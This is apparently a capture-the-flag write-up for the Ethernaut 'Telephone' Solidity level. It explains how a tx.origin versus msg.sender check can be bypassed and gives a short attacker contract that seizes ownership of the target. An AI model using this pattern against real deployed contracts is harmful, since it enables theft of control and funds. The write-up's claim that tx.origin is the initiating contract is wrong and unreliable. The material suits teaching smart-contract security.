In this level we need to Claim ownership of the contract "Telephone" to complete this level.
We can see that owner can be changed by function changeOwner()

```solidity
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
```

This makes us think of the situation where `tx.origin` is not same as `msg.sender`
They are different when the tx is sent by a contract through another contract|
The contract which has intitated this transaction will be the `tx.origin` value and the `msg.sender` will be the changeOwner function caller.

So we can change the `owner` by using the below code

```solidity
    interface Telephone{
        function changeOwner(address _owner) external;
    }

    contract hackTelephone{
        Telephone telephone;

        constructor(address _contract){
            telephone = Telephone(_contract);
        }

        function _changeOwner(address owner) public {
            telephone.changeOwner(owner);
        }
    }
```
